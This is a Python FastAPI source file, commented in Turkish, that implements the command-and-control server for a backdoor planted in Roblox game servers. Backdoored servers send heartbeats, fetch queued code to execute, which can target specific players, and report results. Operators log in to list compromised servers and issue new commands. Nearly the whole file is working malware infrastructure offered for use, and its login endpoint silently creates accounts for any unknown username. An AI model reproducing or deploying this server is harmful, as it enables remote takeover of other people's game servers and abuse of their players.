"""
Roblox Backdoor C2 Server - FastAPI Backend
Plan A: Ana modüler backdoor için web sunucusu
Optimize edildi: Docker gerektirmez, Render/Replit/Glitch uyumlu
"""

from fastapi import FastAPI, HTTPException, Depends, Header, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import List, Optional, Dict, Any
from datetime import datetime, timedelta
import uuid
import json
import os
import asyncio
from motor.motor_asyncio import AsyncIOMotorClient
from bson import ObjectId
import hashlib
import secrets

app = FastAPI(title="Roblox Backdoor C2", version="1.0.0")

# CORS Middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configuration
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
DATABASE_NAME = "roblox_backdoor"
JWT_SECRET = os.getenv("JWT_SECRET", secrets.token_hex(32))
JWT_ALGORITHM = "HS256"

# MongoDB Client
try:
    client = AsyncIOMotorClient(MONGODB_URI)
    db = client[DATABASE_NAME]
    print(f"Connected to MongoDB: {MONGODB_URI}")
except Exception as e:
    print(f"MongoDB connection failed: {e}")
    print("Using in-memory storage for testing")
    db = None

# Security
security = HTTPBearer()

# In-memory storage (fallback)
memory_servers = {}
memory_commands = {}
memory_results = {}
memory_users = {}

# Pydantic Models
class HeartbeatData(BaseModel):
    placeId: int
    jobId: str
    playerCount: int
    uptime: float
    version: str

class CommandData(BaseModel):
    id: str
    code: str
    target: str  # "all" or "specific"
    targetPlayer: Optional[str] = None

class CommandResult(BaseModel):
    commandId: str
    status: str  # "success" or "error"
    output: str
    error: str

class ServerInfo(BaseModel):
    placeId: int
    jobId: str
    placeName: str
    playerCount: int
    uptime: float
    maxPlayers: int
    serverType: str
    lastSeen: datetime

class ExecuteRequest(BaseModel):
    code: str
    target: str = "all"
    targetPlaceId: Optional[int] = None
    targetJobId: Optional[str] = None
    targetPlayer: Optional[str] = None

# Helper Functions
def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    to_encode.update({"exp": expire})
    encoded_jwt = secrets.token_hex(32)
    return encoded_jwt

async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    token = credentials.credentials
    # Basit token doğrulama (gerçek uygulamada JWT kullanın)
    if db:
        user = await db.users.find_one({"token": token})
    else:
        user = memory_users.get(token)
    
    if not user:
        raise HTTPException(status_code=401, detail="Invalid token")
    return user

# API Endpoints

@app.get("/")
async def root():
    return {
        "message": "Roblox Backdoor C2 Server",
        "version": "1.0.0",
        "status": "running",
        "storage": "mongodb" if db else "memory"
    }

@app.post("/api/v1/heartbeat")
async def heartbeat(data: HeartbeatData):
    """
    Backdoor'dan gelen heartbeat verilerini işle
    """
    try:
        server_key = f"{data.placeId}_{data.jobId}"
        server_doc = {
            "placeId": data.placeId,
            "jobId": data.jobId,
            "playerCount": data.playerCount,
            "uptime": data.uptime,
            "version": data.version,
            "lastSeen": datetime.utcnow(),
            "status": "active"
        }
        
        if db:
            # MongoDB kullan
            await db.servers.update_one(
                {"placeId": data.placeId, "jobId": data.jobId},
                {"$set": server_doc},
                upsert=True
            )
        else:
            # Memory kullan
            memory_servers[server_key] = server_doc
        
        return {"status": "success", "message": "Heartbeat received"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/commands")
async def get_commands(placeId: int, jobId: str):
    """
    Belirli bir sunucu için bekleyen komutları al
    """
    try:
        commands = []
        
        if db:
            # MongoDB kullan
            commands = await db.commands.find({
                "targetPlaceId": placeId,
                "targetJobId": jobId,
                "status": "pending"
            }).to_list(length=100)
            
            # Komutları işaretle (executing)
            for cmd in commands:
                await db.commands.update_one(
                    {"_id": cmd["_id"]},
                    {"$set": {"status": "executing", "executedAt": datetime.utcnow()}}
                )
                cmd["_id"] = str(cmd["_id"])
        else:
            # Memory kullan
            for cmd_id, cmd in memory_commands.items():
                if (cmd.get("targetPlaceId") == placeId and 
                    cmd.get("targetJobId") == jobId and 
                    cmd.get("status") == "pending"):
                    cmd["status"] = "executing"
                    cmd["executedAt"] = datetime.utcnow()
                    commands.append(cmd)
        
        return {"commands": commands}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/result")
async def command_result(result: CommandResult):
    """
    Komut sonucunu kaydet
    """
    try:
        result_doc = {
            "commandId": result.commandId,
            "status": result.status,
            "output": result.output,
            "error": result.error,
            "timestamp": datetime.utcnow()
        }
        
        if db:
            # MongoDB kullan
            await db.results.insert_one(result_doc)
            await db.commands.update_one(
                {"id": result.commandId},
                {"$set": {"status": "completed", "completedAt": datetime.utcnow()}}
            )
        else:
            # Memory kullan
            memory_results[result.commandId] = result_doc
            if result.commandId in memory_commands:
                memory_commands[result.commandId]["status"] = "completed"
                memory_commands[result.commandId]["completedAt"] = datetime.utcnow()
        
        return {"status": "success", "message": "Result received"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/servers")
async def get_servers(user: dict = Depends(verify_token)):
    """
    Aktif sunucuları listele
    """
    try:
        servers = []
        
        if db:
            # MongoDB kullan
            servers = await db.servers.find({"status": "active"}).to_list(length=1000)
            for server in servers:
                server["_id"] = str(server["_id"])
        else:
            # Memory kullan
            servers = list(memory_servers.values())
        
        return {"servers": servers}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/execute")
async def execute_command(request: ExecuteRequest, user: dict = Depends(verify_token)):
    """
    Yeni komut oluştur ve kuyruğa ekle
    """
    try:
        command_id = f"cmd_{uuid.uuid4().hex[:8]}"
        
        command_doc = {
            "id": command_id,
            "code": request.code,
            "target": request.target,
            "targetPlaceId": request.targetPlaceId,
            "targetJobId": request.targetJobId,
            "targetPlayer": request.targetPlayer,
            "status": "pending",
            "createdAt": datetime.utcnow(),
            "createdBy": user["username"]
        }
        
        if db:
            # MongoDB kullan
            await db.commands.insert_one(command_doc)
        else:
            # Memory kullan
            memory_commands[command_id] = command_doc
        
        return {"status": "success", "commandId": command_id}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/results/{commandId}")
async def get_command_result(commandId: str, user: dict = Depends(verify_token)):
    """
    Komut sonucunu al
    """
    try:
        result = None
        
        if db:
            # MongoDB kullan
            result = await db.results.find_one({"commandId": commandId})
            if result:
                result["_id"] = str(result["_id"])
        else:
            # Memory kullan
            result = memory_results.get(commandId)
        
        if not result:
            raise HTTPException(status_code=404, detail="Result not found")
        
        return result
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/v1/auth/login")
async def login(username: str, password: str):
    """
    Kullanıcı girişi ve token oluşturma
    """
    try:
        user = None
        
        if db:
            # MongoDB kullan
            user = await db.users.find_one({"username": username})
        else:
            # Memory kullan
            for token, u in memory_users.items():
                if u.get("username") == username:
                    user = u
                    break
        
        if not user:
            # Yeni kullanıcı oluştur (demo için)
            token = secrets.token_hex(32)
            user_doc = {
                "username": username,
                "password": hashlib.sha256(password.encode()).hexdigest(),
                "token": token,
                "createdAt": datetime.utcnow()
            }
            
            if db:
                await db.users.insert_one(user_doc)
            else:
                memory_users[token] = user_doc
            
            user = user_doc
        else:
            # Şifre kontrolü
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            if user.get("password") != password_hash:
                raise HTTPException(status_code=401, detail="Invalid credentials")
        
        return {
            "status": "success",
            "token": user.get("token"),
            "username": user.get("username")
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.delete("/api/v1/servers/{placeId}/{jobId}")
async def remove_server(placeId: int, jobId: str, user: dict = Depends(verify_token)):
    """
    Sunucuyu listeden kaldır
    """
    try:
        server_key = f"{placeId}_{jobId}"
        
        if db:
            # MongoDB kullan
            result = await db.servers.delete_one({
                "placeId": placeId,
                "jobId": jobId
            })
            
            if result.deleted_count == 0:
                raise HTTPException(status_code=404, detail="Server not found")
        else:
            # Memory kullan
            if server_key in memory_servers:
                del memory_servers[server_key]
            else:
                raise HTTPException(status_code=404, detail="Server not found")
        
        return {"status": "success", "message": "Server removed"}
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/stats")
async def get_stats(user: dict = Depends(verify_token)):
    """
    İstatistikleri al
    """
    try:
        if db:
            # MongoDB kullan
            total_servers = await db.servers.count_documents({"status": "active"})
            total_commands = await db.commands.count_documents({})
            total_results = await db.results.count_documents({})
        else:
            # Memory kullan
            total_servers = len([s for s in memory_servers.values() if s.get("status") == "active"])
            total_commands = len(memory_commands)
            total_results = len(memory_results)
        
        return {
            "totalServers": total_servers,
            "totalCommands": total_commands,
            "totalResults": total_results
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# Background Tasks
async def cleanup_old_servers():
    """
    24 saatten önce görülmeyen sunucuları temizle
    """
    while True:
        try:
            cutoff_time = datetime.utcnow() - timedelta(hours=24)
            
            if db:
                # MongoDB kullan
                result = await db.servers.delete_many({
                    "lastSeen": {"$lt": cutoff_time}
                })
                print(f"Cleaned up {result.deleted_count} old servers")
            else:
                # Memory kullan
                to_remove = []
                for key, server in memory_servers.items():
                    if server.get("lastSeen", datetime.utcnow()) < cutoff_time:
                        to_remove.append(key)
                
                for key in to_remove:
                    del memory_servers[key]
                
                print(f"Cleaned up {len(to_remove)} old servers")
        except Exception as e:
            print(f"Cleanup error: {e}")
        
        await asyncio.sleep(3600)  # Her saatte bir

# Startup Event
@app.on_event("startup")
async def startup_event():
    print("Roblox Backdoor C2 Server Started")
    print(f"Storage: {'MongoDB' if db else 'In-Memory'}")
    # Background task başlat
    asyncio.create_task(cleanup_old_servers())

# Shutdown Event
@app.on_event("shutdown")
async def shutdown_event():
    print("Roblox Backdoor C2 Server Stopped")
    if db:
        client.close()

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
